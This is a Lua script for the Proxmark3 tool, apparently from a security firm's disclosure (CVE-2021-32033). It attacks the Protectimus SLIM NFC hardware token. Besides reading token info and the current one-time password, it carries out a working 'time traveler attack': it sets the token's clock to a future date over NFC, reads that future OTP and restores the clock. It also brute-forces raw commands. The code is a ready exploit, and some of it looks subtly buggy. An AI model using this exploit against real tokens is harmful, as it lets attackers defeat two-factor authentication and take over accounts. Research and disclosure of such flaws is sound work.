local cmds = require('commands')
local getopt = require('getopt')
local lib14a = require('read14a')
local utils = require('utils')
local ansicolors = require('ansicolors')

copyright = '(c) 2021 SySS GmbH'
author = 'Matthias Deeg'
version = 'v0.8'
desc = [[
This script can perform different operations on a Protectimus SLIM NFC
hardware token - including a time traveler attack. See: SYSS-2021-007 (CVE-2021-32033)
]]
example = [[
-- default
script run hf_14a_protectimus_nfc
]]
usage = [[
script run hf_14a_protectimus_nfc [-h | -i | -r | -t 2029-01-01T13:37:00+01:00]
]]
arguments = [[
-h   This help
-i   Read token info (e.g. firmware version, OTP interval)
-r   Read the current one-time password (OTP)
-t   Perform a time traveler attack to a specific datetime (yyyy-mm-ddTHH:MM:SS+HO:MO)
     e.g. 2029-01-01T13:37:00+01:00
]]

-- Some globals
local DEBUG = false -- the debug flag

-- Defined operations
local READ_OTP = 1                  -- read the one-time password
local READ_INFO = 2                 -- read the NFC token info
local TIME_TRAVELER_ATTACK = 3      -- perform a time traveler attack

-- A debug printout function
local function dbg(args)
    if not DEBUG then return end
    if type(args) == 'table' then
        local i = 1
        while args[i] do
            dbg(args[i])
            i = i + 1
        end
    else
        print('###', args)
    end
end

-- This is only meant to be used when errors occur
local function oops(err)
    print('ERROR:', err)
    core.clearCommandBuffer()
    return nil, err
end

-- Usage help
local function help()
    print(copyright)
    print(author)
    print(version)
    print(desc)
    print(ansicolors.cyan .. 'Usage' .. ansicolors.reset)
    print(usage)
    print(ansicolors.cyan .. 'Arguments' .. ansicolors.reset)
    print(arguments)
    print(ansicolors.cyan .. 'Example usage' .. ansicolors.reset)
    print(example)
end

-- Get the Unix time (epoch) for a datetime string (yyyy-mm-ddTHH:MM:SS+HO:MO)
function getUnixTime(datetime)

    -- get time delta regarding Coordinated Universal Time (UTC)
    local now_local = os.time()
    local time_delta_to_utc = os.difftime(now_local, os.time(os.date("!*t", now_local)))
    local hour_offset, minute_offset = math.modf(time_delta_to_utc / 3600)

    -- try to match datetime pattern "yyyy-mm-ddTHH:MM:SS"
    local datetime_pattern = "(%d+)-(%d+)-(%d+)T(%d+):(%d+):(%d+)+(%d+):(%d+)"
    local new_year, new_month, new_day, new_hour, new_minute, new_seconds, new_hour_offset, new_minute_offset = datetime:match(datetime_pattern)

    if new_year == nil or new_month == nil or new_day == nil or
        new_hour == nil or new_minute == nil or new_seconds == nil or
        new_hour_offset == nil or new_minute_offset == nil then

        print("[" .. ansicolors.red .. "-" .. ansicolors.reset .."] Error: Could not parse the given datetime\n" ..
               "    Use the following format: yyyy-mm-ddTHH:MM:SS+HO:MO\n" ..
               "    e.g. 2029-01-01T13:37:00+01:00")
        return nil
    end

    -- get the requested datetime as Unix time (UTC)
    local epoch = os.time({year = new_year, month = new_month, day = new_day, hour = new_hour + hour_offset - new_hour_offset,
                          min = new_minute + minute_offset - new_minute_offset, sec = new_seconds})

    return epoch
end

-- Send a "raw" IOS 14443-A package, i.e. "hf 14a raw" command
function sendRaw(rawdata, options)

    -- send raw
    local flags = lib14a.ISO14A_COMMAND.ISO14A_NO_DISCONNECT
    + lib14a.ISO14A_COMMAND.ISO14A_RAW
    + lib14a.ISO14A_COMMAND.ISO14A_APPEND_CRC

    local command = Command:newMIX{
        cmd = cmds.CMD_HF_ISO14443A_READER,

        -- arg1 is the defined flags for sending "raw" ISO 14443A package
        arg1 = flags,

        -- arg2 contains the length, which is half the length of the ASCII
        -- string data
        arg2 = string.len(rawdata) / 2,
        data = rawdata
    }

    return command:sendMIX(options.ignore_response)
end

-- Read the current one-time password (OTP)
function readOTP(show_output)
    -- read OTP command
    local cmd = "028603420042"
    local otp_value = ''

    if show_output then
        print("[" .. ansicolors.green .. "+" .. ansicolors.reset .. "] Try to read one-time password (OTP)")
    end

    -- send the raw command
    res, err = sendRaw(cmd , {ignore_response = ignore_response})
    if err then
        lib14a.disconnect()
        return oops(err)
    end

    -- parse the response
    local cmd_response = Command.parse(res)
    local len = tonumber(cmd_response.arg1) * 2
    local data = string.sub(tostring(cmd_response.data), 0, len - 4)

    -- check the response
    if len == 0 then
        print("[" .. ansicolors.red .. "-" .. ansicolors.reset .."] Error: Could not read the OTP")
        return nil
    end

    if data:sub(0, 8) == "02AA0842" then
        -- extract the binary-coded decimal (BCD) OTP value from the response
        for i = 10, #data - 2, 2 do
            local c = data:sub(i, i)
            otp_value = otp_value .. c
        end

        -- show the output if requested
        if show_output then
            print("[" .. ansicolors.green .. "+" .. ansicolors.reset .. "] OTP: " .. ansicolors.green .. otp_value .. ansicolors.reset)
        end
    else
        print("[" .. ansicolors.red .. "-" .. ansicolors.reset .."] Error: Could not read the OTP")
        otp_value = nil
    end

    return otp_value
end

-- Read token info
function readInfo(show_output)
    -- read info command
    local cmd = "0286021010"

    if show_output then
        print("[" .. ansicolors.green .. "+" .. ansicolors.reset .. "] Try to read token info")
    end

    -- send the raw command
    res, err = sendRaw(cmd , {ignore_response = ignore_response})
    if err then
        lib14a.disconnect()
        return oops(err)
    end

    -- parse the response
    local cmd_response = Command.parse(res)
    local len = tonumber(cmd_response.arg1) * 2
    local data = string.sub(tostring(cmd_response.data), 0, len - 4)

    -- check the response
    if len == 0 then
        print("[-] Error: Could not read the token info")
        return nil
    end

    if data:sub(0, 8) == "02AA0B10" then
        -- extract the token info from the response
        local hardware_schema = tonumber(data:sub(11, 12))
        local firmware_version_major = tonumber(data:sub(13, 14))
        local firmware_version_minor = tonumber(data:sub(13, 14))
        local hardware_rtc = tonumber(data:sub(19, 20))
        local otp_interval = tonumber(data:sub(23, 24))

        local info = "[" .. ansicolors.green .. "+" .. ansicolors.reset .. "] Token info\n" ..
                     "    Hardware schema:  " .. ansicolors.green .. "%s" .. ansicolors.reset .."\n" ..
                     "    Firmware version: " .. ansicolors.green .. "%s.%s" .. ansicolors.reset .. "\n" ..
                     "    Hardware RTC:     " .. ansicolors.green .. "%s" .. ansicolors.reset .. "\n" ..
                     "    OTP interval:     " .. ansicolors.green .. "%s" .. ansicolors.reset

        -- check hardware real-time clock (RTC)
        if hardware_rtc == 1 then
            hardware_rtc = true
        else
            hardware_rtc = false
        end

        -- check one-time password interval
        if otp_interval == 0 then
            otp_interval = '30'
        elseif otp_interval == 10 then
            otp_interval = '60'
        else
            otp_interval = 'unknown'
        end

        if show_output then
            -- show the token info
            print(string.format(info, hardware_schema, firmware_version_major,
                                firmware_version_minor, hardware_rtc,
                                otp_interval))
        end

        return otp_interval
    else
        print("[" .. ansicolors.red .. "-" .. ansicolors.reset .."] Error: Could not read the token info")
        otp_value = nil
    end

    return info
end

-- Bruteforce commands
function bruteforceCommands()
    -- read OTP command
    local cmd = ''

    if show_output then
        print("[" .. ansicolors.green .. "+" .. ansicolors.reset .. "] Bruteforce commands")
    end

    for n = 0, 255 do
        cmd = string.format("028602%d%d", n)

        print(string.format("[+] Send command %s", cmd))

        -- send the raw command
        res, err = sendRaw(cmd , {ignore_response = ignore_response})
        if err then
            lib14a.disconnect()
            return oops(err)
        end

        -- parse the response
        local cmd_response = Command.parse(res)
        local len = tonumber(cmd_response.arg1) * 2
        local data = string.sub(tostring(cmd_response.data), 0, len - 4)

        -- check the response
        if len == 0 then
            print("[" .. ansicolors.red .. "-" .. ansicolors.reset .."] Error: No response")
        else
            print(data)
        end

        io.read(1)
    end
end


-- Set an arbitrary Unix time (epoch)
function setTime(time, otp_interval)
    -- calculate the two required time variables
    local time_var1 = math.floor(time / otp_interval)
    local time_var2 = math.floor(time % otp_interval)

    -- build the raw command data
    local data = "120000" ..string.format("%02x", otp_interval) .. string.format("%08x", time_var1) .. string.format("%02x", time_var2)

    -- calculate XOR checksum on data
    local checksum = 0
    for i = 1, #data, 2 do
        local c = data:sub(i, i + 1)
        checksum = bit32.bxor(checksum , tonumber(c, 16))
    end

    -- build the complete raw command
    local cmd = "0286" .. string.format("%02x", string.len(data) / 2 + 1) .. data .. string.format("%02x", checksum)

    print(string.format("[" .. ansicolors.green .. "+" .. ansicolors.reset .. "] Set Unix time " .. ansicolors.yellow .. "%d" .. ansicolors.reset, time))

    -- send raw command
    res, err = sendRaw(cmd , {ignore_response = ignore_response})
    if err then
        lib14a.disconnect()
        return oops(err)
    end

    -- parse the response
    local cmd_response = Command.parse(res)
    local len = tonumber(cmd_response.arg1) * 2
    local data = string.sub(tostring(cmd_response.data), 0, len - 4)
end

-- Set the current time
function setCurrentTime(otp_interval)
    -- get the current Unix time (epoch)
    local current_time = os.time(os.date("*t"))
    setTime(current_time, otp_interval)
end

-- Perform a time travel attack for generating a future OTP
function timeTravelAttack(datetime_string, otp_interval)
    if nil == datetime_string then
        print("[" .. ansicolors.red .. "-" .. ansicolors.reset .."] Error: No valid datetime string given")
        return nil
    end

    -- get the future time as Unix time
    local future_time = getUnixTime(datetime_string)

    if nil == future_time then
        return
    end

    -- set the future time
    setTime(future_time, otp_interval)

    print("[" .. ansicolors.red .. "!" .. ansicolors.reset .. "] Please power the token and press <ENTER>")
    -- while loop do
    io.read(1)

    -- read the OTP
    local otp = readOTP(false)
    print(string.format("[" .. ansicolors.green .. "+" .. ansicolors.reset .. "] The future OTP on " ..
                        ansicolors.yellow .. "%s (%d) " .. ansicolors.reset .. "is " ..
                        ansicolors.green .. "%s" .. ansicolors.reset, datetime_string, future_time, otp))

    -- reset the current time
    setCurrentTime(otp_interval)
end

-- Show a fancy banner
function banner()
    print(string.format("Proxmark3 Protectimus SLIM NFC Script %s by Matthias Deeg - SySS GmbH\n" ..
                        "Perform different operations on a Protectimus SLIM NFC hardware token", version))
end

-- The main entry point
function main(args)
    local ignore_response = false
    local no_rats = false
    local operation = READ_OTP
    local target_time = nil

    -- show a fancy banner
    banner()

    -- read the parameters
    for o, a in getopt.getopt(args, 'hirt:b') do
        if o == 'h' then return help() end
        if o == 'i' then operation = READ_INFO end
        if o == 'r' then operation = READ_OTP end
        if o == 't' then
            operation = TIME_TRAVELER_ATTACK
            target_time = a
        end
        if o == 'b' then bruteforceCommands() end
    end

    -- connect to the TOTP hardware token
    info, err = lib14a.read(true, no_rats)
    if err then
        lib14a.disconnect()
        return oops(err)
    end

    -- show tag info
    print(("[" .. ansicolors.green .. "+" .. ansicolors.reset .. "] Found token with UID " .. ansicolors.green .. "%s" .. ansicolors.reset):format(info.uid))

    -- perform the requested operation
    if operation == READ_OTP then
        readOTP(true)
    elseif operation == READ_INFO then
        readInfo(true)
    elseif operation == TIME_TRAVELER_ATTACK then
        -- read token info and get OTP interval
        local otp_interval = readInfo(false)
        if nil == otp_interval then
            return
        end
        -- perform time traveler attack
        timeTravelAttack(target_time, otp_interval)
    end

    -- disconnect
    lib14a.disconnect()
end

-------------------------
-- Testing
-------------------------
function selftest()
    DEBUG = true
    dbg('Performing test')
    main()
    dbg('Tests done')
end
-- Flip the switch here to perform a sanity check.
-- It read a nonce in two different ways, as specified in the usage-section
if '--test' == args then
    selftest()
else
    -- Call the main
    main(args)
end
